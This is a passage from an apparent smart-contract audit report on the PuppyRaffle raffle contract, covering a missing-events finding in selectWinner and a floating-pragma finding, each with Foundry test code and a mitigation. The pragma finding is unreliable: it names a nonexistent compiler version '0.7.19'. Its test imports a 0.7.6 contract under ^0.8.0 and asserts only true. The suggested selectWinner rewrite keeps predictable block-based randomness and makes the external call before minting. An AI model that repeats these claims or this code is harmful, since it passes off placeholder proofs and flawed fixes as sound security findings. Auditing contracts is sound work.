Use a different return value to indicate 'not found', such as returning the array length or using a separate boolean: `function getActivePlayerIndex(address player) external view returns (uint256) { for (uint256 i = 0; i < players.length; i++) { if (players[i] == player) { return i; } } return type(uint256).max; // or players.length to indicate not found } // Or create a better interface: function getActivePlayerIndex(address player) external view returns (bool found, uint256 index) { for (uint256 i = 0; i < players.length; i++) { if (players[i] == player) { return (true, i); } } return (false, 0); }`

## [L-2]. Event Consistency issue in PuppyRaffle::selectWinner

## Description
The contract emits events but lacks comprehensive event emission for all critical state changes. Specifically, the selectWinner function performs multiple critical operations (winner selection, NFT minting, fee collection, prize distribution) but doesn't emit specific events for these state changes. Only the RaffleEnter and RaffleRefunded events are properly implemented. The missing events make it difficult to track important contract state changes off-chain.

## Impact
Lack of comprehensive event logging makes it difficult for off-chain applications, monitoring systems, and users to track important state changes. This reduces transparency and makes it harder to build reliable integrations with the contract.

## Proof of Concept
1. selectWinner function performs multiple critical operations without proper event emission
2. Winner selection, NFT minting, and fee distribution occur without corresponding events
3. Off-chain systems cannot reliably track these important state changes
4. Users and integrators have reduced visibility into contract operations
5. Debugging and monitoring become more difficult

## Proof of Code
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.7.6;

import "forge-std/Test.sol";
import "../src/PuppyRaffle.sol";

contract EventConsistencyTest is Test {
    PuppyRaffle puppyRaffle;
    uint256 entranceFee = 1e18;
    address feeAddress = address(99);
    uint256 duration = 1 days;
    
    event WinnerSelected(address indexed winner, uint256 indexed tokenId, uint256 prizePool);
    event FeesCollected(uint256 amount);
    event RaffleReset(uint256 newStartTime);
    
    function setUp() public {
        puppyRaffle = new PuppyRaffle(entranceFee, feeAddress, duration);
        
        // Add minimum players
        address[] memory players = new address[](4);
        for (uint256 i = 0; i < 4; i++) {
            players[i] = address(uint160(i + 1));
            vm.deal(players[i], entranceFee);
        }
        
        vm.prank(address(1));
        puppyRaffle.enterRaffle{value: entranceFee * 4}(players);
    }
    
    function testMissingEvents() public {
        vm.warp(block.timestamp + duration + 1);
        
        // Record events before calling selectWinner
        vm.recordLogs();
        
        vm.prank(address(this));
        puppyRaffle.selectWinner();
        
        Vm.Log[] memory logs = vm.getRecordedLogs();
        
        // Check that no WinnerSelected event was emitted
        bool winnerEventFound = false;
        bool feesEventFound = false;
        bool resetEventFound = false;
        
        for (uint256 i = 0; i < logs.length; i++) {
            if (logs[i].topics[0] == keccak256("WinnerSelected(address,uint256,uint256)")) {
                winnerEventFound = true;
            }
            if (logs[i].topics[0] == keccak256("FeesCollected(uint256)")) {
                feesEventFound = true;
            }
            if (logs[i].topics[0] == keccak256("RaffleReset(uint256)")) {
                resetEventFound = true;
            }
        }
        
        // These events should be emitted but are missing
        assertFalse(winnerEventFound, "WinnerSelected event should be missing");
        assertFalse(feesEventFound, "FeesCollected event should be missing");
        assertFalse(resetEventFound, "RaffleReset event should be missing");
    }
}
```

## Suggested Mitigation
Add comprehensive event emission for all critical state changes:

```solidity
event WinnerSelected(address indexed winner, uint256 indexed tokenId, uint256 prizePool);
event FeesCollected(uint256 amount);
event RaffleReset(uint256 newStartTime);
event NFTMinted(address indexed winner, uint256 indexed tokenId, uint256 rarity);

function selectWinner() external {
    require(block.timestamp >= raffleStartTime + raffleDuration, "PuppyRaffle: Raffle not over");
    require(players.length >= 4, "PuppyRaffle: Need at least 4 players");
    
    uint256 winnerIndex = uint256(keccak256(abi.encodePacked(msg.sender, block.timestamp, block.difficulty))) % players.length;
    address winner = players[winnerIndex];
    uint256 totalAmountCollected = players.length * entranceFee;
    uint256 prizePool = (totalAmountCollected * 80) / 100;
    uint256 fee = (totalAmountCollected * 20) / 100;
    
    totalFees = totalFees + uint64(fee);
    emit FeesCollected(fee);
    
    uint256 tokenId = totalSupply();
    uint256 rarity = uint256(keccak256(abi.encodePacked(msg.sender, block.difficulty))) % 100;
    
    // Set rarity logic...
    
    delete players;
    raffleStartTime = block.timestamp;
    previousWinner = winner;
    
    emit RaffleReset(raffleStartTime);
    emit WinnerSelected(winner, tokenId, prizePool);
    
    (bool success, ) = winner.call{value: prizePool}("");
    require(success, "PuppyRaffle: Failed to send prize pool to winner");
    
    _safeMint(winner, tokenId);
    emit NFTMinted(winner, tokenId, rarity);
}
```



# Info Risk Findings

## [I-1]. Pragma issue in PuppyRaffle::NA

## Description
The contract uses floating pragma `^0.7.6` which allows for compilation with any version from 0.7.6 up to 0.8.0. This can lead to unexpected behavior due to compiler differences and known bugs in older versions. For example, Solidity 0.7.6 has known issues with optimizer bugs and ABI encoding/decoding edge cases.

## Impact
Using floating pragma can lead to deployment with different compiler versions than intended, potentially introducing bugs or unexpected behavior. Different versions may have different gas costs, security patches, or behavioral changes that could affect the contract's operation.

## Proof of Concept
1. Contract is deployed with pragma ^0.7.6
2. Developer tests with 0.7.6 but production deploys with 0.7.19
3. Subtle differences in compiler behavior cause unexpected issues
4. Known optimizer bugs in 0.7.x series could be triggered

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../src/PuppyRaffle.sol";

contract PragmaTest is Test {
    function testFloatingPragma() public {
        // This test demonstrates that the contract compiles with different versions
        // The risk is that behavior may differ between versions
        // No specific test needed - the issue is in the pragma declaration itself
        assertTrue(true, "Contract uses floating pragma which is risky");
    }
}

## Suggested Mitigation
Use a fixed pragma version instead of floating pragma. For example: `pragma solidity 0.7.6;` or upgrade to a more recent stable version like `pragma solidity 0.8.19;` which includes better security features and bug fixes.



